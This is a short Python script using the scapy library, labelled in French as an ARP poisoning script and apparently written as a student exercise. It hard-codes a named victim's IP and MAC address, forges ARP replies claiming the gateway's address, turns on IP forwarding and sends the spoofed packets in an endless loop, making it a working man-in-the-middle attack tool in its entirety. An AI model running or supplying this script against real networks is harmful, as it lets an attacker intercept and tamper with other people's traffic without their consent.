#Script Python ARP POISONING - Antoine TOUPET - 12/02/2016 - Aston
#coding: utf8

from scapy.all import *
import time
import os

op=1 
#IP de la victime -> Dans ce cas JC
victim="10.3.102.67" 
#IP de la gateway
spoof="10.3.102.254" 
#Adresse Mac de la victime -> Dans ce cas JC / Identifiée avec arp -a 
mac="f8:b1:56:d9:d3:8b"  

arp=ARP(op=1, psrc=spoof, pdst=victim, hwdst=mac)

#IP Forwarding
os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")


while 1:
	send(arp)
	time.sleep(2)
